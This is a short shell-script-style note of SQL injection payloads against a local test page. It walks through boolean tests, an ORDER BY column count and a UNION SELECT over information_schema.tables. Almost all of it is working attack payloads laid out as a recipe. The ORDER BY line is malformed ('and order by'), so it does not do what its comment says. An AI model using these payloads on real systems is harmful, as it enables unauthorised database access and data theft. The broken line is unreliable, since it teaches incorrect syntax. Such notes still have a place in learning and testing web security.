#!/bin/sh

# mysql injection

# tampering with urls


# append logical statement end of url 


http://localhost/fake/index.php?page=products&id=1

# logical statement (1=1)
http://localhost/fake/index.php?page=products&id=1 and 1=1--

# illogical statement (1=0)
http://localhost/fake/index.php?page=products&id=1 and 1=0--

# check how may columns there are by incrementation until you get an eror
http://localhost/fake/index.php?page=products&id=1 and order by 1--

# this will tell you hw many columns there are in the table


http://localhost/fake/index.php?page=products&id=1+union+select+1,2,3,4+from+information_schema.tables-- 
